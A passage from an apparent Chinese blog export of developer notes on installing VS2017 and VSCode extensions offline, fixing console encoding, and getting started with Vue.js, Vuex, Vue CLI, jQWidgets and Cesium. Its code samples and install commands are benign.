    <content><![CDATA[<p>Visual Studio 2017版本采用模块化安装方式，根据用户选择模块按需安装。这种方式在用户能够上网的情况下十分方便，但在离线情况下就无法使用。下面介绍在离线情况下如何打包安装Visual Studio community 2017的方法。</p>
<h1 id="下载VS2017社区版安装包获取程序"><a href="#下载VS2017社区版安装包获取程序" class="headerlink" title="下载VS2017社区版安装包获取程序"></a>下载VS2017社区版安装包获取程序</h1><p>到官网下载最新版本的vs_community_xxxxxx.exe的下载器。</p>
<h1 id="运行命令下载所需安装包"><a href="#运行命令下载所需安装包" class="headerlink" title="运行命令下载所需安装包"></a>运行命令下载所需安装包</h1><p>运行如下命令获取VS2017的工作负载：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\vs_community__208176120.1522073957.exe --layout e:\vs2017_offline --lang zh-CN --add Microsoft.VisualStudio.Workload.CoreEditor --add Microsoft.VisualStudio.Workload.NativeDesktop --includeRecommended --includeOptional</span><br></pre></td></tr></table></figure>
<p>可从参考链接[2]中获取工作负载ID。如需更多语言包或者更多安装指令，请参考官方离线安装命令指南，即参考链接[3]。</p>
<h1 id="VS2017社区版-30天许可证过期解决方法"><a href="#VS2017社区版-30天许可证过期解决方法" class="headerlink" title="VS2017社区版 30天许可证过期解决方法"></a>VS2017社区版 30天许可证过期解决方法</h1><p>解决方法步骤如下：</p>
<ol>
<li>外网电脑打开Vistual Studio Community2017。</li>
<li>在许可证过期弹窗中登陆即可自动下载许可证完成激活。许可证下载路径（C:\Users\user\AppData\Local\Microsoft\VSCommon\OnlineLicensing）</li>
<li>拷贝外网中的OnlineLicensing文件夹到内网电脑相应路径下（C:\Users\user\AppData\Local\Microsoft\VSCommon）</li>
<li>打开内网电脑Vistual Studio Community2017将不会再弹出许可证到期窗口。</li>
</ol>
<h1 id="VS2017控制台输出中文乱码问题"><a href="#VS2017控制台输出中文乱码问题" class="headerlink" title="VS2017控制台输出中文乱码问题"></a>VS2017控制台输出中文乱码问题</h1><p>请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/sinat_20265495/article/details/77749383" target="_blank" rel="noopener">VS2017控制台输出中文乱码 ，怎么设置编码格式（utf-8）？</a></li>
<li><a href="https://blog.csdn.net/qq_39621009/article/details/122817826" target="_blank" rel="noopener">修改cmd控制台默认代码页编码的几种方法【GBK、UTF-8】</a></li>
<li><a href="https://www.cnblogs.com/Harley-Quinn/p/7487745.html" target="_blank" rel="noopener">VS2017新建windows控制台程序打印中文乱码问题</a></li>
<li><a href="https://blog.51cto.com/kuangke/3181591" target="_blank" rel="noopener">VS2019控制台输出中文乱码问题已解决</a></li>
<li></li>
</ul>
<h1 id="VS2017中-ipch文件删除问题"><a href="#VS2017中-ipch文件删除问题" class="headerlink" title="VS2017中.ipch文件删除问题"></a>VS2017中.ipch文件删除问题</h1><p><em>.ipch文件和</em>.sdf文件是Visual Studio用来保存预编译的头文件 和Intellisense 用的，删除这些文件对于工程的开发完全没有影响。具体方法请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/weixin_44560698/article/details/118904626" target="_blank" rel="noopener">VisualStudio 产生的.ipch文件可以删除吗？</a></li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://docs.microsoft.com/en-us/visualstudio/install/create-an-offline-installation-of-visual-studio" target="_blank" rel="noopener">Create an offline installation of Visual Studio</a>, by microsoft</li>
<li><a href="https://docs.microsoft.com/zh-cn/visualstudio/install/workload-component-id-vs-community" target="_blank" rel="noopener">Visual Studio Community 组件目录</a>, by microsoft</li>
<li><a href="https://docs.microsoft.com/en-us/visualstudio/install/use-command-line-parameters-to-install-visual-studio" target="_blank" rel="noopener">Use command-line parameters to install Visual Studio</a>, by microsoft</li>
<li><a href="https://blog.csdn.net/jxyb2012/article/details/83009765" target="_blank" rel="noopener">Vistual Studio Community 2017 30天许可证过期</a>,by 井底一蛤蟆.</li>
<li><a href="https://blog.csdn.net/sinat_20265495/article/details/77749383" target="_blank" rel="noopener">VS2017控制台输出中文乱码 ，怎么设置编码格式（utf-8）？</a>,by 小凡1991.</li>
<li><a href="https://blog.csdn.net/weixin_44560698/article/details/118904626" target="_blank" rel="noopener">VisualStudio 产生的.ipch文件可以删除吗？</a>,by Jacob-xyb.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue-js入门简介</title>
    <url>/2019/07/26/Vue-js%E5%85%A5%E9%97%A8%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<p>Vue (读音 /vjuː/，类似于 view) 是一套用于构建用户界面的渐进式框架。与其它大型框架不同的是，Vue 被设计为可以自底向上逐层应用。Vue 的核心库只关注视图层，不仅易于上手，还便于与第三方库或既有项目整合。另一方面，当与现代化的工具链以及各种支持类库结合使用时，Vue 也完全能够为复杂的单页应用提供驱动。</p>
<h1 id="Vue实例生命周期图示"><a href="#Vue实例生命周期图示" class="headerlink" title="Vue实例生命周期图示"></a>Vue实例生命周期图示</h1><p align="center">
    <img src="https://v2.cn.vuejs.org/images/lifecycle.png" width="90%" alt="Vue实例生命周期图示"/>
</p>

<h1 id="核心插件Vuex"><a href="#核心插件Vuex" class="headerlink" title="核心插件Vuex"></a>核心插件Vuex</h1><p>Vuex 是一个专为 Vue.js 应用程序开发的状态管理模式。它采用集中式存储管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。</p>
<p align="center">
    <img src="https://vuex.vuejs.org/vuex.png" width="90%" alt="Vuex工作原理示意图"/>
</p>

<h2 id="Vuex核心store"><a href="#Vuex核心store" class="headerlink" title="Vuex核心store"></a>Vuex核心store</h2><p>每一个 Vuex 应用的核心就是 store（仓库）。“store”基本上就是一个容器，它包含着你的应用中大部分的状态 (state)。Vuex 和单纯的全局对象有以下两点不同：</p>
<ol>
<li><p>Vuex 的状态存储是响应式的。当 Vue 组件从 store 中读取状态的时候，若 store 中的状态发生变化，那么相应的组件也会相应地得到高效更新。</p>
</li>
<li><p>你不能直接改变 store 中的状态。改变 store 中的状态的唯一途径就是显式地提交 (commit) mutation。这样使得我们可以方便地跟踪每一个状态的变化，从而让我们能够实现一些工具帮助我们更好地了解我们的应用。</p>
</li>
</ol>
<p>安装 Vuex 之后，让我们来创建一个 store。创建过程直截了当——仅需要提供一个初始 state 对象和一些 mutation：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 如果在模块化构建系统中，请确保在开头调用了 Vue.use(Vuex)</span><br><span class="line"></span><br><span class="line">const store &#x3D; new Vuex.Store(&#123;</span><br><span class="line">  state: &#123;</span><br><span class="line">    count: 0</span><br><span class="line">  &#125;,</span><br><span class="line">  mutations: &#123;</span><br><span class="line">    increment (state) &#123;</span><br><span class="line">      state.count++</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>现在，你可以通过 store.state 来获取状态对象，以及通过 store.commit 方法触发状态变更：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">store.commit(&#39;increment&#39;)</span><br><span class="line"></span><br><span class="line">console.log(store.state.count) &#x2F;&#x2F; -&gt; 1</span><br></pre></td></tr></table></figure>

<h2 id="Vuex核心概念"><a href="#Vuex核心概念" class="headerlink" title="Vuex核心概念"></a>Vuex核心概念</h2><h3 id="State"><a href="#State" class="headerlink" title="State"></a>State</h3><p>Vuex 使用单一状态树——是的，用一个对象就包含了全部的应用层级状态。至此它便作为一个“唯一数据源 (SSOT)”而存在。这也意味着，每个应用将仅仅包含一个 store 实例。单一状态树让我们能够直接地定位任一特定的状态片段，在调试的过程中也能轻易地取得整个当前应用状态的快照。</p>
<p>Vuex 通过 store 选项，提供了一种机制将状态从根组件“注入”到每一个子组件中（需调用 Vue.use(Vuex)）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const app &#x3D; new Vue(&#123;</span><br><span class="line">  el: &#39;#app&#39;,</span><br><span class="line">  &#x2F;&#x2F; 把 store 对象提供给 “store” 选项，这可以把 store 的实例注入所有的子组件</span><br><span class="line">  store,</span><br><span class="line">  components: &#123; Counter &#125;,</span><br><span class="line">  template: &#96;</span><br><span class="line">    &lt;div class&#x3D;&quot;app&quot;&gt;</span><br><span class="line">      &lt;counter&gt;&lt;&#x2F;counter&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">  &#96;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>通过在根实例中注册 store 选项，该 store 实例会注入到根组件下的所有子组件中，且子组件能通过 this.$store 访问到。</p>
<h3 id="Getter"><a href="#Getter" class="headerlink" title="Getter"></a>Getter</h3><p>Vuex 允许我们在 store 中定义“getter”（可以认为是 store 的计算属性）。就像计算属性一样，getter 的返回值会根据它的依赖被缓存起来，且只有当它的依赖值发生了改变才会被重新计算。</p>
<p>Getter 接受 state 作为其第一个参数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const store &#x3D; new Vuex.Store(&#123;</span><br><span class="line">  state: &#123;</span><br><span class="line">    todos: [</span><br><span class="line">      &#123; id: 1, text: &#39;...&#39;, done: true &#125;,</span><br><span class="line">      &#123; id: 2, text: &#39;...&#39;, done: false &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  getters: &#123;</span><br><span class="line">    doneTodos: state &#x3D;&gt; &#123;</span><br><span class="line">      return state.todos.filter(todo &#x3D;&gt; todo.done)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>Getter 会暴露为 store.getters 对象，你可以以属性的形式访问这些值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">store.getters.doneTodos &#x2F;&#x2F; -&gt; [&#123; id: 1, text: &#39;...&#39;, done: true &#125;]</span><br></pre></td></tr></table></figure>

<h3 id="Mutation"><a href="#Mutation" class="headerlink" title="Mutation"></a>Mutation</h3><p>更改 Vuex 的 store 中的状态的唯一方法是提交 mutation。Vuex 中的 mutation 非常类似于事件：每个 mutation 都有一个字符串的 事件类型 (type) 和 一个 回调函数 (handler)。这个回调函数就是我们实际进行状态更改的地方，并且它会接受 state 作为第一个参数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const store &#x3D; new Vuex.Store(&#123;</span><br><span class="line">  state: &#123;</span><br><span class="line">    count: 1</span><br><span class="line">  &#125;,</span><br><span class="line">  mutations: &#123;</span><br><span class="line">    increment (state) &#123;</span><br><span class="line">      &#x2F;&#x2F; 变更状态</span><br><span class="line">      state.count++</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>你不能直接调用一个 mutation handler。这个选项更像是事件注册：“当触发一个类型为 increment 的 mutation 时，调用此函数。”要唤醒一个 mutation handler，你需要以相应的 type 调用 store.commit 方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">store.commit(&#39;increment&#39;)</span><br></pre></td></tr></table></figure>

<p><strong>注意，Mutation必须是同步函数。</strong></p>
<h3 id="Action"><a href="#Action" class="headerlink" title="Action"></a>Action</h3><p>Action 类似于 mutation，不同在于：</p>
<ul>
<li>Action 提交的是 mutation，而不是直接变更状态。</li>
<li>Action 可以包含任意异步操作。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const store &#x3D; new Vuex.Store(&#123;</span><br><span class="line">  state: &#123;</span><br><span class="line">    count: 0</span><br><span class="line">  &#125;,</span><br><span class="line">  mutations: &#123;</span><br><span class="line">    increment (state) &#123;</span><br><span class="line">      state.count++</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  actions: &#123;</span><br><span class="line">    increment (context) &#123;</span><br><span class="line">      context.commit(&#39;increment&#39;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>Action 通过 store.dispatch 方法触发：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">store.dispatch(&#39;increment&#39;)</span><br></pre></td></tr></table></figure>

<h3 id="Module"><a href="#Module" class="headerlink" title="Module"></a>Module</h3><p>由于使用单一状态树，应用的所有状态会集中到一个比较大的对象。当应用变得非常复杂时，store 对象就有可能变得相当臃肿。</p>
<p>为了解决以上问题，Vuex 允许我们将 store 分割成模块（module）。每个模块拥有自己的 state、mutation、action、getter、甚至是嵌套子模块——从上至下进行同样方式的分割：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const moduleA &#x3D; &#123;</span><br><span class="line">  state: &#123; ... &#125;,</span><br><span class="line">  mutations: &#123; ... &#125;,</span><br><span class="line">  actions: &#123; ... &#125;,</span><br><span class="line">  getters: &#123; ... &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const moduleB &#x3D; &#123;</span><br><span class="line">  state: &#123; ... &#125;,</span><br><span class="line">  mutations: &#123; ... &#125;,</span><br><span class="line">  actions: &#123; ... &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const store &#x3D; new Vuex.Store(&#123;</span><br><span class="line">  modules: &#123;</span><br><span class="line">    a: moduleA,</span><br><span class="line">    b: moduleB</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">store.state.a &#x2F;&#x2F; -&gt; moduleA 的状态</span><br><span class="line">store.state.b &#x2F;&#x2F; -&gt; moduleB 的状态</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://cn.vuejs.org/v2/guide/" target="_blank" rel="noopener">Vue.js 教程</a>,by Vue.js Homepage.</li>
<li><a href="https://vuex.vuejs.org/zh/" target="_blank" rel="noopener">Vuex教程</a>,by Vue.js Homepage.</li>
<li><a href="https://blog.csdn.net/weixin_31021649/article/details/113452898" target="_blank" rel="noopener">vue 页面销毁函数_45. 聊聊 Vue 的生命周期</a>,by atone2003.</li>
<li><a href="https://blog.csdn.net/longtengg1/article/details/118758447" target="_blank" rel="noopener">使用vue-router切换组件时使组件不销毁</a>,by 龙易安.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue-cli-3集成jQWidgets</title>
    <url>/2019/07/19/Vue-cli-3%E9%9B%86%E6%88%90jQWidgets/</url>
    <content><![CDATA[<p>jQWidgets是一个软件框架，包含小部件，主题，输入验证，拖放插件，数据适配器，内置WAI-ARIA可访问性，国际化和MVVM支持。它建立在开放标准和技术HTML5，CSS，JavaScript和jQuery之上。该库用于开发响应式Web和移动应用程序。下面介绍在Vuejs中集成jQWidgets。</p>
<h1 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h1><ul>
<li>node.js: v10.16.0</li>
<li>npm: 6.9.0</li>
<li>vue: 2.6.10</li>
<li>cesium: 1.45.0</li>
<li>vue-cli: 3.9.2</li>
<li>webpack: 4.28.4</li>
</ul>
<h1 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h1><ul>
<li>安装vue-cli</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install -g @vue&#x2F;cli</span><br></pre></td></tr></table></figure>

<ul>
<li>创建应用</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vue create jqwidgets-vue-cli-app   &#x2F;&#x2F;Choose the default preset</span><br></pre></td></tr></table></figure>

<ul>
<li>导航到应用</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd jqwidgets-vue-cli-app</span><br></pre></td></tr></table></figure>

<ul>
<li>安装jQWidgets依赖</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install jqwidgets-scripts --save--dev</span><br></pre></td></tr></table></figure>

<ul>
<li><p>从node_modules/jqwidgets-scripts/jqwidgets复制styles文件夹到public文件夹。</p>
</li>
<li><p>在index.html链接 jqx.base.css 文件。</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;.&#x2F;styles&#x2F;jqx.base.css&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>修改App.vue如下：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;JqxBarGauge ref&#x3D;&quot;barGaugeReference&quot;</span><br><span class="line">        :width&#x3D;&quot;600&quot; :height&#x3D;&quot;600&quot; </span><br><span class="line">        :values&#x3D;&quot;values&quot; :formatFunction&#x3D;&quot;formatFunction&quot; </span><br><span class="line">    &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"> </span><br><span class="line">&lt;script&gt;</span><br><span class="line">    import JqxBarGauge from &#39;jqwidgets-scripts&#x2F;jqwidgets-vue&#x2F;vue_jqxbargauge.vue&#39;;</span><br><span class="line"> </span><br><span class="line">    export default &#123;</span><br><span class="line">        components: &#123;</span><br><span class="line">            JqxBarGauge</span><br><span class="line">        &#125;,</span><br><span class="line">        data: function () &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                values: [10, 20, 30, 40, 50]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line">            formatFunction: function (value, index, color) &#123;</span><br><span class="line">                return color;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>运行Vue Cli开发服务器</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm run serve</span><br></pre></td></tr></table></figure>

<ul>
<li>在浏览器中输入 localhost:8080 查看结果。</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.jqwidgets.com/vue-components-documentation/documentation/vue-cli/vue-cli.htm" target="_blank" rel="noopener">Vue CLI with jQWidgets</a>,by jQWidgets.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue-js父子组件渲染过程简介</title>
    <url>/2019/09/03/Vue-js%E7%88%B6%E5%AD%90%E7%BB%84%E4%BB%B6%E6%B8%B2%E6%9F%93%E8%BF%87%E7%A8%8B%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<p>Vuejs组件化开发是前端工程化的一个重要里程碑。在实际开发过程中，子组件渲染得不到理想的视觉效果。导致这一问题的原因埋藏在Vuejs父子组件的渲染过程。因此简单介绍Vuejs父子组件的渲染过程。</p>
<h1 id="加载渲染过程"><a href="#加载渲染过程" class="headerlink" title="加载渲染过程"></a>加载渲染过程</h1><p>父beforeCreate-&gt;父created-&gt;父beforeMount-&gt;子beforeCreate-&gt;子created-&gt;子beforeMount-&gt;子mounted-&gt;父mounted</p>
<h1 id="子组件更新过程"><a href="#子组件更新过程" class="headerlink" title="子组件更新过程"></a>子组件更新过程</h1><p>父beforeUpdate-&gt;子beforeUpdate-&gt;子updated-&gt;父updated</p>
<h1 id="父组件更新过程"><a href="#父组件更新过程" class="headerlink" title="父组件更新过程"></a>父组件更新过程</h1><p>父beforeUpdate-&gt;父updated</p>
<h1 id="销毁过程"><a href="#销毁过程" class="headerlink" title="销毁过程"></a>销毁过程</h1><p>父beforeDestroy-&gt;子beforeDestroy-&gt;子destroyed-&gt;父destroyed</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://juejin.im/post/5bf37cb8e51d451b3b63f590" target="_blank" rel="noopener">vue父子组件的渲染顺序</a>, by rosenWang.</li>
<li><a href="https://huangwang.github.io/2019/07/26/Vue-js%E5%85%A5%E9%97%A8%E7%AE%80%E4%BB%8B/">Vue-js入门简介</a>,by jackhuang.</li>
<li><a href="https://www.jianshu.com/p/8bdc80cb0275" target="_blank" rel="noopener">inheritAttrs、vm.$listeners 、vm.$attrs 详解</a>,by 简单tao的简单.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
    <title>VSCode离线安装插件</title>
    <url>/2019/09/07/VSCode%E7%A6%BB%E7%BA%BF%E5%AE%89%E8%A3%85%E6%8F%92%E4%BB%B6/</url>
    <content><![CDATA[<p>Visual Studio Code（简称VS Code）是一个由微软开发，同时支持Windows 、 Linux和macOS等操作系统且开放源代码的代码编辑器。与Sublime相比，VSCode开源，且有强大的社区支持，各种插件层出不穷。因为工作原因，需要在离线情况下使用VSCode。为了增强VSCode的功能，需要离线情况下安装其插件。具体方法如下：</p>
<h1 id="下载VSCode插件"><a href="#下载VSCode插件" class="headerlink" title="下载VSCode插件"></a>下载VSCode插件</h1><p>从VSCode的官方市场<a href="https://marketplace.visualstudio.com/vscode" target="_blank" rel="noopener">Extensions for the Visual Studio family of products</a>搜索和下载插件。官方市场下载VSCode插件可能会下载失败，可以跑到插件的github代码库，下载其最新发布版。</p>
<p align="center">
    <img src="images/vscode_plugin_download.jpg" width="100%" alt="下载VSCode插件"/>
</p>
<center>图1 下载VSCode插件</center>

<h1 id="离线安装VSCode插件"><a href="#离线安装VSCode插件" class="headerlink" title="离线安装VSCode插件"></a>离线安装VSCode插件</h1><p>打开VSCode的软件，选择左侧Extension，点击“…”，选择“从VSIX安装”，选择离线下载的VSCode插件进行安装。</p>
<p align="center">
    <img src="images/vscode_plugin_install.jpg" width="100%" alt="离线安装VSCode插件"/>
</p>
<center>图2  离线安装VSCode插件</center>

<h1 id="下载旧版本VSCode插件"><a href="#下载旧版本VSCode插件" class="headerlink" title="下载旧版本VSCode插件"></a>下载旧版本VSCode插件</h1><p>新版本VSCode插件对VSCode的版本要求也高，会导致新版本VSCode插件无法在旧版本VSCode中无法安装的问题。因此，需要下载旧版本VSCode插件，但是官网上只能下载最新的VSCode插件，因此需要一种方法来解决改问题。具体方法请参考<a href="https://juejin.cn/post/7024097851261059086" target="_blank" rel="noopener">vscode下载之前版本插件</a>，本质上就是修改VSCode插件下载链接中的版本号参数。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/Visual_Studio_Code" target="_blank" rel="noopener">Visual Studio Code</a>,by wikipedia.</li>
<li><a href="https://marketplace.visualstudio.com/vscode" target="_blank" rel="noopener">Extensions for the Visual Studio family of products</a>,by vscode.</li>
<li><a href="https://zhuanlan.zhihu.com/p/66056611" target="_blank" rel="noopener">GitHub最热！码代码不得不知的所有定律法则</a>,by Dave Kerr.</li>
<li><a href="https://juejin.cn/post/7024097851261059086" target="_blank" rel="noopener">vscode下载之前版本插件</a>,by itas109.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue.js开发入门简易教程</title>
    <url>/2019/07/18/Vue-js%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>Vue.js（/vjuː/，或简称为Vue）是一个用于创建用户界面的开源JavaScript框架，也是一个创建单页应用的Web应用框架。Vue与React、Angular一起成为当前三大最流行的Web应用框架。下面简单介绍使用Vue CLI脚手架工具创建简单的Web应用。</p>
<h1 id="Vue-CLI简介"><a href="#Vue-CLI简介" class="headerlink" title="Vue CLI简介"></a>Vue CLI简介</h1><p>Vue CLI 是一个基于 Vue.js 进行快速开发的完整系统，提供：</p>
<ul>
<li>通过 @vue/cli 搭建交互式的项目脚手架。</li>
<li>通过 @vue/cli + @vue/cli-service-global 快速开始零配置原型开发。</li>
<li>一个运行时依赖 (@vue/cli-service)，该依赖：<ul>
<li>可升级；</li>
<li>基于 webpack 构建，并带有合理的默认配置；</li>
<li>可以通过项目内的配置文件进行配置；</li>
<li>可以通过插件进行扩展。</li>
</ul>
</li>
<li>一个丰富的官方插件集合，集成了前端生态中最好的工具。</li>
<li>一套完全图形化的创建和管理 Vue.js 项目的用户界面。</li>
</ul>
<p>Vue CLI 致力于将 Vue 生态中的工具基础标准化。它确保了各种构建工具能够基于智能的默认配置即可平稳衔接，这样你可以专注在撰写应用上，而不必花好几天去纠结配置的问题。与此同时，它也为每个工具提供了调整配置的灵活性，无需 eject。</p>
<p>Vue CLI 有几个独立的部分:</p>
<ul>
<li>CLI</li>
</ul>
<p>CLI (@vue/cli) 是一个全局安装的 npm 包，提供了终端里的 vue 命令。它可以通过 vue create 快速创建一个新项目的脚手架，或者直接通过 vue serve 构建新想法的原型。你也可以通过 vue ui 通过一套图形化界面管理你的所有项目。</p>
<ul>
<li>CLI 服务</li>
</ul>
<p>CLI 服务 (@vue/cli-service) 是一个开发环境依赖。它是一个 npm 包，局部安装在每个 @vue/cli 创建的项目中。</p>
<p>CLI 服务是构建于 webpack 和 webpack-dev-server 之上的。它包含了：</p>
<pre><code>* 加载其它 CLI 插件的核心服务；
* 一个针对绝大部分应用优化过的内部的 webpack 配置；
* 项目内部的 vue-cli-service 命令，提供 serve、build 和 inspect 命令。</code></pre><p>如果你熟悉 create-react-app 的话，@vue/cli-service 实际上大致等价于 react-scripts，尽管功能集合不一样。</p>
<ul>
<li>CLI 插件</li>
</ul>
<p>CLI 插件是向你的 Vue 项目提供可选功能的 npm 包，例如 Babel/TypeScript 转译、ESLint 集成、单元测试和 end-to-end 测试等。Vue CLI 插件的名字以 @vue/cli-plugin- (内建插件) 或 vue-cli-plugin- (社区插件) 开头，非常容易使用。</p>
<p>当你在项目内部运行 vue-cli-service 命令时，它会自动解析并加载 package.json 中列出的所有 CLI 插件。</p>
<p>插件可以作为项目创建过程的一部分，或在后期加入到项目中。它们也可以被归成一组可复用的 preset。</p>
<h1 id="Vue-CLI安装"><a href="#Vue-CLI安装" class="headerlink" title="Vue CLI安装"></a>Vue CLI安装</h1><blockquote>
<p>Vue CLI 需要 Node.js 8.9 或更高版本 (推荐 8.11.0+)。你可以使用 nvm 或 nvm-windows 在同一台电脑中管理多个 Node 版本。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install -g @vue&#x2F;cli</span><br></pre></td></tr></table></figure>

<p>安装之后，你就可以在命令行中访问 vue 命令。你可以通过简单运行 vue，看看是否展示出了一份所有可用命令的帮助信息，来验证它是否安装成功。</p>
<h1 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h1><p>运行以下命令来创建一个新项目：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vue create hello-world</span><br></pre></td></tr></table></figure>

<h1 id="运行项目"><a href="#运行项目" class="headerlink" title="运行项目"></a>运行项目</h1><p>在一个 Vue CLI 项目中，@vue/cli-service 安装了一个名为 vue-cli-service 的命令。你可以在 npm scripts 中以 vue-cli-service、或者从终端中以 ./node_modules/.bin/vue-cli-service 访问这个命令。</p>
<p>这是你使用默认 preset 的项目的 package.json：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;serve&quot;: &quot;vue-cli-service serve&quot;,</span><br><span class="line">    &quot;build&quot;: &quot;vue-cli-service build&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>你可以通过 npm 调用这些 script：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm run serve</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/Vue.js" target="_blank" rel="noopener">Vue.js</a>,by wikipedia.</li>
<li><a href="https://cli.vuejs.org/zh/" target="_blank" rel="noopener">vue cli</a>,by vuejs homepage.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue.js集成Cesium</title>
    <url>/2018/05/11/Vue-js%E9%9B%86%E6%88%90Cesium/</url>
    <content><![CDATA[<p>近期在研究集成封装Cesium为Vue.js组件，记录一下过程，防止忘了。</p>
<h2 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h2><ul>
<li>node.js: v8.9.4</li>
<li>npm: 5.6.0</li>
<li>vue: 2.5.2</li>
<li>cesium: 1.45.0</li>
<li>vue-cli: 2.9.3</li>
<li>webpack: 3.6.0</li>
</ul>
<p><strong>注意此处vue-cli版本是2，因此该教程不适用vue-cli 3。如需在Vue-cli 3中构建Cesium，请参考<a href="https://www.jianshu.com/p/0815c76d949f" target="_blank" rel="noopener">Vue-cli 3.0 + cesium 构建</a>.</strong></p>
<h2 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h2><ol>
<li>安装nodejs</li>
<li>安装vue-cli脚手架<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install -g vue-cli</span><br><span class="line">vue init webpack my-project</span><br><span class="line">cd my-project</span><br><span class="line">npm install</span><br><span class="line">npm run dev</span><br></pre></td></tr></table></figure></li>
<li>安装cesium<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install --save cesium</span><br></pre></td></tr></table></figure></li>
<li>webpack配置</li>
</ol>
<ul>
